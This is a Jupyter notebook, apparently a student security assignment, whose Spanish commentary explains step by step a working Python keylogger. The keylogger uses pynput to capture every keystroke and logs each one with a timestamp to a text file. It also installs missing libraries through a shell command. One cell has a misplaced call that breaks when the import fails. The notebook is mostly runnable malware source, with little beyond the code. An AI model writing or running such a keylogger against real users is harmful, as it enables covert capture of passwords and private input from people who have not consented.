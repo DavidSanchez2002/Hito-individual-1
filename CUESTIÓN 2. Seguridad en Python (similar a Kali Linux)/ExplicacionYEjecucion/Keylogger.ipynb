{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b0d7b56c",
   "metadata": {},
   "source": [
    "Importamos la libreria subprocess para poder ejecutar comandos en el cmd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25deeca6",
   "metadata": {},
   "outputs": [],
   "source": [
    "from subprocess import check_output"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4a6a0819",
   "metadata": {},
   "source": [
    "Hacemos un try except para importar pynput ya que hay veces que da fallo y si da fallo hacemos el pip install con la libreriaque importamos anteriormente.\n",
    "La libreria pynput la utilizaremos para leer las pulsacions por teclado."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fb190652",
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    from pynput.keyboard import Key, Listener\n",
    "except:\n",
    "    comando = \"pip install pynput\"\n",
    "check_output(comando, shell=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ed9ac212",
   "metadata": {},
   "source": [
    "Hacemos lo mismo con el try except que hicimos con la libreria anterior.\n",
    "La libreria logging nos ayudará a guardar las pulsaciones por teclado en un archivo."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fa186782",
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    import logging\n",
    "except:\n",
    "    comando = \"pip install logging\"\n",
    "    check_output(comando, shell=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c4677d06",
   "metadata": {},
   "source": [
    "Ahora utilizando la libreria logging definimos como queremos que se llame nuestro archivo seguido de el nivel con el que queremos que guarde el archivo, en este caso nivel DEBUG y el formato con el que vamos a guardar los datos format=\" %(asctime)s - %(message)s\"\n",
    "\n",
    "Nivel DEBUG: La información de registro más detallada, un escenario de aplicación típico es el diagnóstico de problemas\n",
    "%(asctime)s:Contruye el registro del tiempo actual de una forma detallada incluyendo milisegundos (2021-11-25 21:12:18,523)\n",
    "%(message)s:El contenido que vamos a guardar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3e9f83fc",
   "metadata": {},
   "outputs": [],
   "source": [
    "logging.basicConfig(filename=(\"registro.txt\"), level=logging.DEBUG, format=\" %(asctime)s - %(message)s\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e19b573",
   "metadata": {},
   "source": [
    "La funcion on_press() recibe como argumento la tecla pulsada, lo convierte en cadena y lo guarda en el archivo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae4e9488",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    logging.info(str(key))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a2b7f156",
   "metadata": {},
   "source": [
    "Este metodo sirve como oyente por lo que cada vez que se presiona una tecla el metodo se activa y llama a la funcion on_press.\n",
    "El .join() lo usamos para unirlo al hilo principal."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fbb17803",
   "metadata": {},
   "outputs": [],
   "source": [
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
